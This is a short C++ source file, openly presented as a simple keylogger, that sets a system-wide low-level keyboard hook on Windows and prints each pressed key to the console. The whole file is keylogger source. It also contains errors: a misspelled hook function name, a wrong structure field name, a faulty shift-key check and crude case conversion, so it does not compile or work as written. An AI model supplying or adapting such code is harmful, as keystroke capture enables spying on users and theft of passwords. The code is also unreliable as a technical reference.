/*
Simple keylogger in C++ using the Windows API documentation
*/

#include <stdio.h>
#include <windows.h>

HHOOK hook;  // global variable for the hhook value received

LRESULT CALLBACK hook_function(int code, WPARAM wParam, LPARAM lParam);

int main() {
	MSG msg;  // message variable

	hook = SetWindowHookExA(WH_KEYBOARD_LL, hook_function, NULL, 0);

	// if the function fails, then the value returned is null
	if(hook == NULL) { 
		printf("An error ocurred in the hook.\n");
		return(1);
	}

	while(GetMessage(&msg, NULL, 0, 0) != 0){
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	UnhookWindowsHookEx(hook);
}

LRESULT CALLBACK hook_function(int code, WPARAM wParam, LPARAM lParam){
	char ch;
	// structure with the information about low-level keyboard input events
	PKBDLLHOOKSTRUCT kbdllhook = (PKBDLLHOOKSTRUCT)lParam;
	
	// takes only the keydown input so that it doesn't duplicate the keys pressed
	if(wParam == WM_KEYDOWN && code == HC_ACTION){
		if(!GetAsyncKeyState(VK_SHIFT)){
			ch = kbdllhook->vkcode + 32;
		}
		
		else{
			ch = kbdllhook->vkcode;
		}

		printf("%c", ch);
	}

	return(CallNextHookEx(hook, code, wParam, lParam)); // make it so the hooks from other applications don't get cancelled
}
